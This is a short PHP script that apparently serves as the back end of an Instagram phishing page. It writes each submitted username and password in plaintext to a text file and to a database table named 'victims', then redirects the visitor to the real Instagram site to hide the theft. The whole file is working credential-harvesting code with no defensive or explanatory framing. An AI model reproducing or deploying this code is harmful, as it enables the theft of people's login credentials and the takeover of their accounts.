<?php

file_put_contents("usernames.txt", "Account: " . $_POST['username'] . "\n Pass: " . $_POST['password'] . "\n", FILE_APPEND);


// initializing variables
$username = "";
$password    = "";

// connect to the database
$db = mysqli_connect('localhost', 'root', '', 'instagram');

// REGISTER USER
if (isset($_POST['loguser'])) {
  // receive all input values from the form
  $username = mysqli_real_escape_string($db, $_POST['username']);
  $password = mysqli_real_escape_string($db, $_POST['password']);

  }

  // first check the database to make sure 
  // a user does not already exist with the same username and/or email
  $user_check_query = "SELECT * FROM victims WHERE username='$username' OR password='$password' LIMIT 1";
  $result = mysqli_query($db, $user_check_query);
  $user = mysqli_fetch_assoc($result);
  

  // Finally, register user if there are no errors in the form
  $query = "INSERT INTO victims (username, password) 
  			  VALUES('$username', '$password')";
  	mysqli_query($db, $query);



header('Location: https://instagram.com');
exit();
